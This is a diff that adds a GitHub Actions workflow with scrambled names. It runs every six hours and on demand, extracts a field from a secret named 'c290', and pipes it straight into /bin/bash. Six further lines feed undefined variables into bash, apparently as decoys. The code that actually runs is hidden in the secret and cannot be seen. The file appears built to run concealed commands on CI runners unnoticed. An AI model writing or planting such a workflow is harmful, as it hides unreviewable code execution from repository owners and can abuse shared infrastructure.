@@ -1,0 +1,23 @@
+name: mvvmgrace91
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mvvmgrace91
+        env:
+          c290: ${{ secrets.c290 }}
+        run: |
+          printf '%s' "$c290" | jq -r .ptlqq0205 | /bin/bash
+          echo $rrwl1686 | jq -r .nmj278 | /bin/bash
+          echo $viwxu7269 | jq -r .bkr388 | /bin/bash
+          echo $xsaxa9193 | jq -r .nby8697 | /bin/bash
+          echo $jb5027 | jq -r .td500 | /bin/bash
+          echo $pud77 | jq -r .wd13 | /bin/bash
+          echo $mgl5652 | jq -r .lc461 | /bin/bash
+
